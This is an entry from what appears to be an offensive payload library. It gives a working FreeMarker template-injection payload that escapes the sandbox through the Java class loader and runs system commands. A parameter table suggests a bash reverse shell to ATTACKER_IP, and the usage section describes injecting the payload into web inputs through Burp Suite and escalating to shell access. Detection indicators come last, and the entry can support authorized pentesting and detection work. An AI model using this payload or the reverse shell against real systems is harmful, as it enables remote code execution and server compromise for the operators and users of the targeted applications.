---
id: 1c56b34a-b010-466d-b24e-996300033489
type: code
language: freemarker
verified: true
created_at: '2023-04-06T03:56:39.073171+00:00'
updated_at: '2023-04-10T20:23:38.561561+00:00'
tags:
  - ssti
  - rce
  - sandbox-bypass
  - freemarker
platforms:
  - Web
  - Java
validated: true
---

# Freemarker-Sandbox-Bypass-Payload

## Code

```freemarker
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

## Description

This FreeMarker template payload bypasses the sandbox by accessing the Java class loader through the 'article' object's protection domain. It loads the ObjectWrapper and Execute classes to instantiate an executor that runs arbitrary system commands. The example executes the 'id' command to demonstrate RCE, but can be modified for other commands like reverse shells or file operations. It targets vulnerable FreeMarker configurations where user input is rendered as templates without proper escaping.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "id" | The system command to execute (replace with any shell command) | "whoami" or "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" |
| article | Assumed available template variable (common in default setups; adjust if different, e.g., use '.globals' ) | N/A (context-dependent) |

## Usage

Inject this payload into a vulnerable input field in a FreeMarker-based web application, such as a user comment, search query, or dynamic content area. Use a proxy like Burp Suite to submit the POST/GET request containing the payload. Start with benign commands like 'id' to verify, then escalate to shell access. This is typically used in SSTI exploitation during web application pentests or red team engagements after confirming template processing.

## Detection

- Application logs showing FreeMarker parsing errors or unexpected class loads (e.g., 'freemarker.template.utility.Execute').
- WAF alerts on payloads containing '<#assign' or class references like 'classLoader'.
- Server-side monitoring for anomalous process spawns (e.g., via Sysmon or auditd) from the web process context.
- Response anomalies: Command output embedded in HTML (e.g., UID/GID info in page content).
- Java heap dumps or profiling tools revealing reflection abuse.

## Related

- [[procedures/Freemarker-Sandbox-Bypass-for-RCE]]
